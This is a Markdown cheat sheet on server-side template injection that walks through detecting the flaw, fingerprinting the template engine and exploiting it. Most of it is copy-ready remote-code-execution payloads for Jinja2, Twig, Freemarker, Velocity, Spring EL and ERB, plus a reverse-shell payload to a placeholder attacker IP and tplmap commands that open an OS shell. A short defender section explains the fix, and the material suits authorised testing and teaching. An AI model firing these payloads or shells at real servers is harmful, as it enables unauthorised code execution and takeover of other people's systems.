# SSTI — Server-Side Template Injection

User input gets embedded into a **server-side template** that the engine then evaluates — so your
input is executed as template code. Because template engines can reach language internals, SSTI
very often escalates straight to **RCE**.

Replace placeholders (`<...>`) with your own values.

---
---

# PART 1 — OVERVIEW (at a glance)

## The method

1. **Detect** — inject a math/polyglot probe; if it's *evaluated* (`49`, not `7*7`), it's SSTI.
2. **Identify the engine** — the probe that works narrows it (Jinja2 vs Twig vs Freemarker vs ERB…).
3. **Exploit** — use that engine's object chain to read files or run commands.

## Detection probe (one string, many engines)

```
${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  {{7*'7'}}
```

```
7*7  → 49          → SSTI (evaluated)
7*7  → 7777777     → likely Twig/Jinja (string repetition on {{7*'7'}})
7*7  → 7*7         → not injectable (or wrong syntax for the engine)
```

## Engine → language (fingerprint)

| Renders `{{7*7}}`=49 | Renders `{{7*'7'}}`=7777777 | Engine / language |
|----------------------|------------------------------|-------------------|
| yes | `7777777` | **Jinja2** (Python) or **Twig** (PHP) |
| yes | error | **Freemarker/Velocity** (Java) — use `${...}` |
| `${7*7}`=49 | — | **Freemarker / Spring** (Java) |
| `<%= 7*7 %>`=49 | — | **ERB** (Ruby) |
| `#{7*7}`=49 | — | **Ruby / Slim** |

## Go-to (once you know the engine)

```python
# Jinja2 (Python) — RCE:
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

## Defender notes (for the report)

- **Never** concatenate user input into a template; pass it as **data**, not template source.
- Use a **logic-less / sandboxed** engine; keep user input out of `render_template_string`-style APIs.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Detect & confirm

Inject the polyglot into every reflected field. Confirm evaluation with math, then distinguish
template-eval from plain XSS with a string op:

```
{{7*7}}      → 49          (evaluated → SSTI, not just reflected)
{{7*'7'}}    → 7777777     (Jinja/Twig) vs error (Java engines)
${7*7}       → 49          (Freemarker/Velocity/Spring EL)
<%= 7*7 %>   → 49          (ERB/Ruby)
```

## Step 2 — Identify the engine

Follow the fingerprint table (Part 1). If `{{ }}` works, it's Python or PHP — separate them:

```
{{7*'7'}}                        Jinja2 → 7777777    Twig → 49
{{settings}}  {{config}}         Jinja2/Flask tells
{{_self}}  {{app}}               Twig/Symfony tells
```

## Step 3 — Exploit by engine

**Jinja2 (Python / Flask)** — reach `os` via an object's globals:

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Twig (PHP)**:

```twig
{{['id']|filter('system')}}
{{['id',1]|sort('system')}}
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

**Freemarker (Java)**:

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**Velocity (Java)** / **Spring EL** / **ERB (Ruby)**:

```
# Velocity
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
# Spring EL:  ${T(java.lang.Runtime).getRuntime().exec('id')}
# ERB (Ruby): <%= system('id') %>   <%= `id` %>   <%= IO.popen('id').read %>
```

## Step 4 — From `id` to a shell

Swap the command for a reverse shell (URL-encode as needed):

```bash
{{cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<your-ip>/4444 0>&1"').read()}}
# listener: nc -lvnp 4444
```

---
---

# PART 3 — PAYLOAD ARSENAL

## Detection polyglots

```
${{<%[%'"}}%\.   ← breaks something in most engines (error = worth digging)
{{7*7}}  ${7*7}  <%=7*7%>  #{7*7}  ${{7*7}}  {{7*'7'}}  {@7*7}  @(7*7)
```

## Engine identification

| Probe result | Engine |
|--------------|--------|
| `{{7*7}}`=49, `{{7*'7'}}`=7777777 | Jinja2 (Python) |
| `{{7*7}}`=49, `{{7*'7'}}`=49 | Twig (PHP) |
| `${7*7}`=49, `<#...>` works | Freemarker (Java) |
| `#set` works | Velocity (Java) |
| `${T(...)}` works | Spring EL (Java) |
| `<%= 7*7 %>`=49 | ERB (Ruby) |

## RCE payloads (quick copy)

```python
Jinja2   {{cycler.__init__.__globals__.os.popen('id').read()}}
Twig     {{['id']|filter('system')}}
Freemark <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Velocity #set($e="e");$e.getClass().forName("java.lang.Runtime")...exec("id")
SpringEL ${T(java.lang.Runtime).getRuntime().exec('id')}
ERB      <%= `id` %>
```

## Tools

```bash
tplmap -u "http://<target>/page?name=X"      # detect + exploit + --os-shell
tplmap -u "http://<target>/" --data "name=X" --os-shell
```

---

**Key idea:** SSTI happens when user input is used as **template source** instead of template
**data**. Confirm with a math probe (`{{7*7}}`→`49`), fingerprint the engine with a string op, then
walk that engine's object graph to reach the language's `os`/`Runtime` and run commands. It's one
of the fastest web-bug-to-RCE paths. Fix: pass user input as data and sandbox the engine.
